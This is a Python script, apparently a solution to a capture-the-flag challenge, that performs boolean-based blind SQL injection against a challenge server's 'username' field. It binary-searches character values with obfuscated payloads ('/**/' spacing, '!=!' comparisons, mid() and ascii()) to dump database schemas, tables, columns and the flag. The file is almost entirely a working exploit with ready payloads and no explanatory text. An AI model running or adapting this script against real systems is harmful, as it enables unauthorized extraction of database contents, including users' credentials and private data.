import requests

asc_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
burp0_url = "http://node5.anna.nssctf.cn:26331/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0", 
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                 "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
                 "Accept-Encoding": "gzip, deflate", 
                 "Content-Type": "application/x-www-form-urlencoded"
                 }
content = ''

for pos in range(1, 100):
    min_num = 32
    max_num = 126
    mid_num = (min_num + max_num) // 2
    while(min_num < max_num):
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='test'),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(flag)/**/from/**/test.flag),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        burp0_data = {"username": payload}
        resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if 'string(39)' in resp.text:
            min_num = mid_num + 1
        else:
            max_num = mid_num
        mid_num = (min_num + max_num) // 2
    content += chr(min_num)
    print(content)